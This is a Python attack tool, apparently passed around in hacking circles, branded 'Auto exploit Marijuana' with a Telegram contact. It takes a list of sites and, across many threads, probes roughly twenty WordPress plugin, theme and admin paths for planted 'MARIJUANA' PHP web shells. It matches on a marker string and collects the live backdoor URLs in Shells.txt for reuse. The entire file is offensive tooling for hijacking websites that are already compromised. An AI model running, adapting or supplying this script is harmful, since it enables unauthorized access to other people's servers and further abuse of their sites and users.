# -*-coding:Latin-1 -*
import sys , requests, re
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
from pathlib import Path 
import os
os.system("clear")
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA
os.system('cls' if os.name == 'nt' else 'clear')
print (""" \033[1;32m
                      .                          
                     M                          
                    dM                          
                    MMr                         
                   4MMML                  .     
                   MMMMM.                xf     
   .              "MMMMM               .MM-     
    Mh..          +MMMMMM            .MMMM      
    .MMM.         .MMMMML.          MMMMMh      
     )MMMh.        MMMMMM         MMMMMMM       
      3MMMMx.     'MMMMMMf      xnMMMMMM"       
      '*MMMMM      MMMMMM.     nMMMMMMP"        
        *MMMMMx    "MMMMM\    .MMMMMMM=         
         *MMMMMh   "MMMMM"   JMMMMMMP           
           MMMMMM   3MMMM.  dMMMMMM            .
            MMMMMM  "MMMM  .MMMMM(        .nnMP"
=..          *MMMMx  MMM"  dMMMM"    .nnMMMMM*  
  "MMn...     'MMMMr 'MM   MMM"   .nMMMMMMM*"   
   "4MMMMnn..   *MMM  MM  MMP"  .dMMMMMMM""     
     ^MMMMMMMMx.  *ML "M .M*  .MMMMMM**"        
        *PMMMMMMhn. *x > M  .MMMM**""           
           ""**MMMMhx/.h/ .=*"                  
                    .3P"%....                   
                  nP"     "*MMnx       
                   
          Auto exploit Marijuana
       Telegram : @Mkra123
""")
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
try:
    fileName = input('\033[1;31mSite Lists: ')
    file = Path(__file__).with_name(fileName)
    target = [i.strip() for i in file.open('r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n\033[1;31m  [!] Enter <' + path[len(path) - 1] + '> <your list.txt>')

poolAmount = int(input("\033[1;31mThreads: "))

def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def FourHundredThree(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/seotheme/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-content/themes/seotheme/mar.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/seotheme/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-content/themes/seotheme/mar.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/images/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/images/mar.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/images/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/images/mar.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/m4r1ju4n4.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/m4r1ju4n4.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/m4r1ju4n4.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/m4r1ju4n4.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr)) 
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/marijuana.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/marijuana.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/marijuana.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/marijuana.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/colors/coffee/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/colors/coffee/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/colors/coffee/marijuana.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/marijuana.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/colors/coffee/marijuana.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/marijuana.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/colors/maro.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/css/colors/maro.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/colors/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/css/colors/maro.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr)) 
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/css/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/css/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/owfsmac/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/mar.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/owfsmac/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/mar.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/maro.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/css/maro.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/css/maro.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/includes/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/includes/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/includes/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/includes/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))   
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/maint/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/maint/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/maint/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/maint/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-content/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-content/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/aryabot/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/aryabot/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr)) 
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/aryabot/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mar.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/aryabot/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mar.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/owfsmac/maro.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/maro.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/owfsmac/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/maro.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-includes/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-includes/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))                 
    except :
        print ('\033[0;31mDEAD-->' + url + ' --> {}[No Response]'.format(fr))
mp = Pool(poolAmount)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

print ('\n [!] {}Saved in Shells.txt'.format(fc))
